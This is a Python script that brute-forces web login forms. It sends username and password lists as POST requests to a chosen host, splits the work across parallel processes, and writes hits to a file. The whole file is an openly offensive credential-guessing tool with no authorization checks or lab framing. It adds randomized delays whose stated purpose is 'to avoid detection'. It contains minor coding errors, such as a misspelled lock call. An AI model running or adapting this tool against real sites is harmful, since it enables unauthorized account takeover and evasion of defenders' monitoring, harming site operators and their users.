#! /usr/bin/python3.12
"""
Brute force a web form.


usage: form_force.py [-h] [-u USERNAME] [-p PASSWORD] [-o OUTPUT] [-v] [-uf USERNAME_FIELD] [-pf PASSWORD_FIELD] [--min-delay MIN_DELAY] [--max-delay MAX_DELAY] host page 

positional arguments:
  host                  URL or IP address of the host
  page                  Path to the form

options:
  -h, --help            show this help message and exit
  -u USERNAME, --username USERNAME
                        Username or file of usernames
  -p PASSWORD, --password PASSWORD
                        Password or file of passwords
  -o OUTPUT, --output OUTPUT
                        Output file
  -v, --verbose         Verbose output
  -uf USERNAME_FIELD, --username-field USERNAME_FIELD
                        Username field name
  -pf PASSWORD_FIELD, --password-field PASSWORD_FIELD
                        Password field name
  --min-delay MIN_DELAY Minimum delay between requests in seconds
  --max-delay MAX_DELAY Maximum delay between requests in seconds


TODO Possible Improvements:
 - pause/resume?
"""
import argparse
import logging
import multiprocessing as mp
from pathlib import Path
from queue import Queue
import requests
import random  # for random delay
import time  # for sleep

HEADERS = {}


def _brute_force_from_worker(
    dest, unames, pwords, out, uname_field, pword_field, min_delay, max_delay, lock, logging=False
):

    if not logging:
        logging.basicConfig(level=logging.ERROR)

    cnt = 0
    result = []
    for uname in unames:
        uname = uname.strip()
        for pword in pwords:
            pword = pword.strip()
            logging.debug(f"Sending POST request with {uname}:{pword}")

            response = requests.post(
                dest,
                data={uname_field: uname, pword_field: pword},
            )

            if response.status_code != 200:
                lock.aquire()
                try:
                    logging.error(f"Unexpected status code: {response.status_code}")
                finally:
                    lock.release()
                exit(1)

            if "Invalid" not in response.text:
                result.append(f"{uname}:{pword}\n")
                # out.write(f"{uname}:{pword}\n")
                logging.debug(f"Valid credentials found: {uname}:{pword}")

            # Add a random sleep interval between requests
            delay = random.uniform(min_delay, max_delay)
            logging.debug(f"Sleeping for {delay:.2f} seconds to avoid detection")
            time.sleep(delay)

        cnt += 1
        logging.info(f"Attempted {cnt} usernames")
        out.put(result)


def brute_force_form(
    host, page, unames, pwords, out, uname_field, pword_field, min_delay, max_delay, jobs=4
):
    """ """
    if not page.startswith("/"):
        page = f"/{page}"

    dest = f"http://{host}{page}"
    logging.info(f"Brute forcing {dest} with {len(unames)} usernames and {len(pwords)} passwords")

    lock = mp.Lock()
    if jobs > 1:

        # split up unames and pwords into chunks for jobs

        if jobs >= max(len(unames), len(pwords)):
            jobs = max(len(unames), len(pwords))

        if len(unames) >= jobs:
            creds = [
                (unames[i : i + len(unames) // jobs], pwords)
                for i in range(0, len(unames), len(unames) // jobs)
            ]

        else:
            creds = [
                (unames, pwords[i : i + len(pwords) // jobs])
                for i in range(0, len(pwords), len(pwords) // jobs)
            ]
        q = mp.Queue()
        with mp.Pool(jobs) as pool:
            workers = []
            for i in creds:
                unames, pwords = i
                res = pool.apply_async(
                    _brute_force_from_worker,
                    args=(
                        dest,
                        unames,
                        pwords,
                        q,
                        uname_field,
                        pword_field,
                        min_delay,
                        max_delay,
                        lock,
                    ),
                )
                workers.append(res)
            for i in workers:
                i.join()
        while not q.empty():
            result = q.get()
            for i in result:
                out.write(i)
    else:
        q = Queue()
        _brute_force_from_worker(
            dest, unames, pwords, q, uname_field, pword_field, min_delay, max_delay, lock, True
        )
        result = q.get()
        for i in result:
            out.write(i)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute force a web form")
    parser.add_argument("host", type=str, help="URL or IP address of the host")
    parser.add_argument("page", type=str, help="Path to the form")
    parser.add_argument("-u", "--username", type=str, help="Username or file of usernames")
    parser.add_argument("-p", "--password", type=str, help="Password or file of passwords")
    parser.add_argument("-o", "--output", type=str, help="Output file", default="logins.txt")
    parser.add_argument(
        "-v", "--verbose", action="store_true", help="Verbose output for single-threaded process"
    )
    parser.add_argument(
        "-uf", "--username-field", type=str, help="Username field name", default="uid"
    )
    parser.add_argument(
        "-pf", "--password-field", type=str, help="Password field name", default="password"
    )
    parser.add_argument(
        "--min-delay", type=float, default=0.5, help="Minimum delay between requests in seconds"
    )
    parser.add_argument(
        "--max-delay", type=float, default=3.0, help="Maximum delay between requests in seconds"
    )
    parser.add_argument(
        "-j", "--jobs", type=int, default=4, help="Number of jobs to run in parallel"
    )
    args = parser.parse_args()

    if args.jobs > 1:
        logging.basicConfig(level=logging.ERROR)
    elif args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)

    if Path(args.username).is_file():
        logging.info(f"Using usernames from file {args.username}")
        with open(args.username, "r", encoding="utf-8") as f:
            unames = f.readlines()
    else:
        unames = [args.username]

    if Path(args.password).is_file():
        logging.info(f"Using passwords from file {args.password}")
        with open(args.password, "r", encoding="utf-8") as f:
            pwords = f.readlines()
    else:
        pwords = [args.password]

    with open(args.output, "w") as out:
        logging.info(f"Writing valid credentials to {args.output}")
        brute_force_form(
            args.host,
            args.page,
            unames,
            pwords,
            out,
            args.username_field,
            args.password_field,
            args.min_delay,
            args.max_delay,
            args.jobs,
        )
